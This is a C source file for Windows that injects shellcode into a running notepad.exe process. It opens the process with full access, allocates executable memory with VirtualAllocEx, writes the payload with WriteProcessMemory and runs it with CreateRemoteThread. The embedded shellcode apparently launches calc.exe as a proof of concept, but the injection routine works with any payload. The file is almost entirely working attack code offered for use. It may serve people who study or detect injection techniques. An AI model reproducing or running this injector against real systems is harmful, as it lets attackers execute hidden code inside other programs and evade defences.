#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>


//Get process ID by name 

DWORD GetProcessIdByName(LPCTSTR name)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	DWORD pid = 0;
	PROCESSENTRY32 pe = { 0 };

	if (hSnapshot != INVALID_HANDLE_VALUE) {
		pe.dwSize = sizeof(PROCESSENTRY32);



		CharLowerBuff(pe.szExeFile, lstrlen(pe.szExeFile));

		
		if (Process32First(hSnapshot, &pe))

		{
			do
			{
				if (lstrcmpi(pe.szExeFile, name) == 0)
				{
					pid = pe.th32ProcessID;
					break;
				}
			} while (Process32Next(hSnapshot, &pe));
		}
		CloseHandle(hSnapshot);
		return pid;
	

	}
}




int main() {



	//ShellCode 
	char calcshell[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
                        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
                        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
                        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
                        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
                        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
                        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
                        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
                        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
                        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
                        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
                        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
                        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
                        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
                        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
                        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
                        "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
                        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
                        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
						"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
	



	//Get process ID by name 
	DWORD pid = GetProcessIdByName(L"notepad.exe");
	printf("PID: %d\n", pid);
	printf("Press any key to continue...\n");
	getchar();




	//Getting el handle 
	
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == NULL) {
		printf("Error: Could not open process for PID (%d).\n", pid);
		return 1;
	}

	//Allocate memory for the shellcode

	LPVOID lpBaseAddress = VirtualAllocEx(hProcess, NULL, sizeof(calcshell), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (lpBaseAddress == NULL) {
	printf("Error: Could not allocate memory inside PID (%d).\n", pid);
			return 1;
		}

	//Write the shellcode to the process
	BOOL pWrite = WriteProcessMemory(hProcess, lpBaseAddress, calcshell, sizeof(calcshell), NULL);
	if (pWrite == 0) {
			printf("Error: Could not write to process memory.\n");
			return 1;
		}

	//Create a remote thread that starts begins at the shellcode
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpBaseAddress, NULL, 0, NULL);
	if (hThread == NULL) {
				printf("Error: Could not create the remote thread.\n");
				return 1;
			}

	return 0;
} 
